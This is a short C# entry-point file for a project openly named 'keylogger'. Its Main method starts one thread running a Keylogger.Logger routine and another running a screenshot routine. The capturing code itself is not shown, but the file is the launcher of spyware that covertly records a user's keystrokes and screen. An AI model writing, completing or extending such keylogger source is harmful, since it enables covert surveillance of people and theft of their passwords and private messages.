using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Drawing;
using System.Linq;
using System.Runtime.InteropServices;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Windows.Input;


namespace keylogger
{
    static class Program
    {
        /// The main entry point for the application.
        private static Thread o1 = new Thread(Keylogger.Logger);
        private static Thread o2 = new Thread(Screenshots.Aantalscreenshots);


        [STAThread]
        static void Main(string[] args)
        {
                o1.SetApartmentState(ApartmentState.STA);
                o1.Start();
                o2.Start();
                
        }
    }
}